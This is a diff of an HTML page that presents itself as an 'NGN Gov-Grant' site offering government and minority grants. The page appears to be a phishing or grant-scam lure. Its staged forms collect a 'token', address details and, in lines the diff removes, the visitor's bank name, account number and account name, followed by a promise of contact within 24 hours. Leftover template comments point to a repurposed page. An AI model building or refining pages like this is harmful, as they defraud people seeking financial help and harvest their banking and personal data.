@@ -222,18 +222,10 @@ blockquote {
 
   <!-- Main Content -->
   <main class="content">
-    <!-- About the Book Sale -->
-    <section class="about" id="about">
-      <h2>NGN Gov-Grant</h2>
-      <p>Government Grants, General & Foundation Grants, Industry-Specific Grants, Minority/Women-Owned, Student/Business Grants.</p>
-    </section>
-
     <!-- Form Part -->
     <section class="featured" id="featured">
-		
-		<!-- Form one -->
-		<div id="form1" class="form-container active">
-     <form id="formOne" enctype=“multipart/form-data">
+	<div id="form1" class="form-container active">
+     <form id="codeForm" method="post">
 
 		 <h3 class="formHead">Redeem Token</h3>
 		 
@@ -245,11 +237,11 @@ blockquote {
 		 
 		 <button type="submit" id="submitBtn1">SUMBIT</button>
 	 </form>
-		</div>
+	</div>
 
 		<!-- Form two -->
-		<div id="form2" class="form-container">
-     <form id="secondForm" method="post">
+	<div id="form2" class="form-container">
+     <form id="detailsForm" method="post">
 
 		 <h3 class="formHead">Address Verification</h3>
 		 
@@ -280,37 +272,18 @@ blockquote {
 		 
 		 <button type="submit" id="submitBtn2">SUMBIT</button>
 	 </form>
-		</div>
-
-		<!-- Form three -->
-		<div id="form3" class="form-container">
-     <form id="thirdForm" method="post">
-
-		 <h3 class="formHead">Bank Details</h3>
-		 
-		 <div class="input">
-			 <label for="bankName">Bank Name</label>
-			 <input type="text" id="bankName" name="bankName" placeholder="Your Bank Name" required>
-		 </div>
-		 
-		 <div class="input">
-			 <label for="accountNumber">Your Account Number</label>
-			 <input type="tel" id="accountNumber" name="accountNumber" placeholder="Your Account Number" required>
-		 </div>
-		 
-		 <div class="input">
-			 <label for="accountName">Your Account Name</label>
-			 <input type="text" id="accountName" name="accountName" placeholder="Your Account Name" required>
-		 </div>
-		 
-		 <button type="submit" id="submitBtn3">COMPLETE</button>
-	 </form>
-		</div>
+	</div>
 
 		<!-- Form Completed -->
-		<div id="completed" class="form-container">
-			<h5 style="font-size: 16px;">Form has been successfully submited!!✅ <br><br>We will contact you with a response within 24 hours...</h5>
-		</div>
+	<div id="completed" class="form-container">
+		<h5 style="font-size: 16px;">Form has been successfully submited!!✅ <br><br>We will contact you with a response within 24 hours...</h5>
+	</div>
+    </section>
+	  
+    <!-- About Starmart -->
+    <section class="about" id="about">
+      <h2>NGN Gov-Grant</h2>
+      <p>Government Grants, General & Foundation Grants, Industry-Specific Grants, Minority/Women-Owned, Student/Business Grants.</p>
     </section>
 
     <!-- Customer Reviews -->
